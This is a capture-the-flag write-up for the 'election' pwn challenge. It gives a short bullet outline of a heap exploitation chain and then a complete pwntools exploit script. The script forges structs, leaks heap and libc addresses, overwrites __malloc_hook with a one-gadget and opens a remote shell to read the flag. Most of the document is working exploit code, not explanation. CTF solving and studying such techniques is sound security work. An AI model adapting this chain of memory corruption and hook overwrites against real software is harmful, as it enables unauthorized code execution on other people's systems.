# election
## Pwn
> 54 solves
* Vote `Ojima` to write everywhere.
* Write `ojima` to `.bss`.
* Forge struct on `.bss`.
* Switch `list` pointer to point to fake struct and its `votes` offset stored `heap` address.
* Vote it to increase the heap pointer.
* Fix `list` pointer to previous one.
* Show candidate to leak `heap base`, cause the name pointer of one candidate has been switched to point to `heap pointer` by voting to increase it.
* Now we can write everywhere on heap cause we got `heap base`.
* Forge `fd` of `single link list` to fake struct which name pointer point to `GOT['__libc_start_main']`.
* Leak libc.
* Overwrite `__malloc_hook` with `one`.
* Stand to get shell.
```python
#!/usr/bin/env python
from pwn import *
import subprocess

# SECCON{I5_7h15_4_fr4ud_3l3c710n?}

context.arch = 'amd64'

e , l = ELF( './election' ) , ELF( './libc-2.23.so' )


host , port = 'baby_stack.pwn.seccon.jp' , 28349
y = remote( host , port )


def std( name ):
    y.sendafter( '>>' , '1' )
    y.sendafter( '>>' , name )


def vote( cho , name , data = '' ):
    y.sendafter( '>>' , '2' )
    y.sendafter( '(Y/n)' , cho )
    y.sendafter( '>>' , name )
    if name =='oshima':
        y.sendafter( '>>' , data )


def res():
    y.sendafter( '>>' , '3' )

e.got['__libc_start_main'] = 0x601fc0


std( 'a' * 0x10 + p64( 0x602080 ) )
std( 'ojima' )
std( 'ojima' )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x6020a2 - 0x10 ) + p64( 0x60 )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x6020a1 - 0x10 ) + p64( 0x21 )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x6020a0 - 0x10 ) + p64( 0x80 )[:-1] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602080 - 0x10 ) + p64( ord( 'o' ) )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602081 - 0x10 ) + p64( ord( 'j' ) )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602082 - 0x10 ) + p64( ord( 'i' ) )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602083 - 0x10 ) + p64( ord( 'm' ) )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602084 - 0x10 ) + p64( ord( 'a' ) )[:-1] )


vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602028 - 0x10 ) + p64( 0xb0 )[:-1] )

for _ in xrange( 0x20 ):
    vote( 'n' ,  'ojima' )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602028 - 0x10 ) + p64( 0x50 )[:-1] )


print 'aaa'

y.sendafter( '>>' , '2' )
y.sendafter( '(Y/n)' , 'y' )

y.recvuntil( '* ' )
y.recvuntil( '* ' )

heap = u64( y.recvline()[:-1].ljust( 8 , '\x00' ) ) - 0x170
log.success( 'heap -> %s' % hex( heap ) )

y.sendafter( '>>' , 'yuawn' )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602010 - 0x10 ) + p64( 0xfe )[:-1] )

std( p64( e.got['__libc_start_main'] ) )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( heap + 0x1b8 - 0x10 + 2 ) + p64( 0x60 )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( heap + 0x1b8 - 0x10 + 1 ) + p64( 0x21 )[:-1] )
vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( heap + 0x1b8 - 0x10 + 0 ) + p64( 0xa0 )[:-1] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602028 - 0x10 ) + p64( 0x20 )[:-1] )

y.sendafter( '>>' , '2' )
y.sendafter( '(Y/n)' , 'y' )

y.recvuntil( '* ' )

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> %s' % hex( l.address ) )

y.sendafter( '>>' , 'yuawn' )

one = l.address + 0xf0274

print hex( one )
print hex( l.symbols['__malloc_hook'] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 5 ) + p64( ( one >> 40 ) & 0xff )[:-1] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 4 ) + p64( ( one >> 32 ) & 0xff )[:-1] )
if ( one >> 32 ) & 0x80:
    vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 5 ) + p64( 0x1 )[:-1] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 3 ) + p64( ( one >> 24 ) & 0xff )[:-1] )
if ( one >> 24 ) & 0x80:
    vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 4 ) + p64( 0x1 )[:-1] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 2 ) + p64( ( one >> 16 ) & 0xff )[:-1] )
if ( one >> 16 ) & 0x80:
    vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 3 ) + p64( 0x1 )[:-1] )


vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 1 ) + p64( ( one >> 8 ) & 0xff )[:-1] )
if ( one >> 8 ) & 0x80:
    vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 2 ) + p64( 0x1 )[:-1] )


vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( l.symbols['__malloc_hook'] - 0x10 + 0 ) + p64( ( one >> 0 ) & 0xff )[:-1] )

vote( 'n' , 'oshima' , 'yes' + '\x00' * 29 + p64( 0x602010 - 0x10 ) + p64( 0xfe )[:-1] )

std( 'yuawn' )

sleep( 0.7 )

y.sendline( 'cat flag.txt' )


y.interactive()
```